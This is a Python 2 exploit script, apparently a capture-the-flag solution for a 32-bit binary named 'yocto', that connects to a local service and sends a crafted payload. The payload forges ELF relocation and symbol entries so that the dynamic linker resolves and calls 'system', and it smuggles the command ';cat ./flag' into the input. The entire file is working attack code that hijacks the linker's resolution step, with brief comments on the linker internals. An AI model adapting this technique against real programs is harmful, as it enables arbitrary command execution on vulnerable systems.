# -*- coding:utf-8 -*-
__author__ = "o_0xJ0k3r"

from zio import *
io = zio(("127.0.0.1", 4444),print_write = False,print_read= False,timeout = 10000)
#args = ['./yocto']

#io = zio(args, timeout=100000)
plt_addr = 0x080482a0 #objdump -s -j.plt
rel_plt_addr = 0x08048270 #objdump -s -j.rel.plt
dynsym_addr = 0x0804818c #objdump -s -j.dynsym
dynstr_addr = 0x080481fc #objdump -s -j.dynstr

bass_addr = 0x080495c0 #glob

fake_reloc_addr = bass_addr + 36    # 0x80495e4
reloc_offset = fake_reloc_addr - rel_plt_addr #0x1374
#const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
# reloc = rel_plt + relc_offset

atoi_got_plt = 0x08049548
atoi_plt = 0x080482e0
 
fake_dynsym_addr = bass_addr + 60   # 0x80495fc
align_dynsym = 0x10 - ((fake_dynsym_addr-dynsym_addr) & 0xF)#修正下因为是0x10对齐的
fake_dynsym_addr += align_dynsym
r_info = (((fake_dynsym_addr-dynsym_addr)/0x10)<<8) | 0x7
# const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
# #define ELF32_R_SYM(i) ((i)>>8)
# | 0x7 --> check : #define ELF32_R_TYPE(i) ((unsigned char)(i)) ;0x7 is FUNC


fake_dynstr_addr = bass_addr + 45   # 0x80495ed
st_name = fake_dynstr_addr - dynstr_addr
# result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, \
#      l->l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);
# result is libc base addr

bin_sh_addr = bass_addr + 76        # 0x804960c

print align_dynsym
"""
push eax   第一个点前面的aoti
push edx   第二个点前面的atoi
jmp ecx    第三个点前面的aoti
"""
payload = str(atoi_plt)#l32(bin_sh_addr)#eax
payload += "."
payload += str(reloc_offset)#l32(reloc_offset)#edx
payload += "."
payload += str(plt_addr)#l32(plt_addr)#jmp ecx


payload += ";cat ./flag\x00"
print len(payload)
payload += "A"*(36-len(payload))

payload += l32(atoi_got_plt)#Elf32_Rel
payload += l32(r_info)#Elf32_Rel

payload += "A"*(45-len(payload))
payload += "system\x00"

print len(payload)
payload += "A"*(60-len(payload))
payload += "\x00"*align_dynsym#修正
payload += l32(st_name)#Elf32_Sym
payload += l32(0)#Elf32_Sym
payload += l32(0)#Elf32_Sym
payload += l32(0x12)#Elf32_Sym

print len(payload)
payload += "A"*(80-len(payload))

print payload
raw_input("$")
io.write(payload)
print io.read(100)
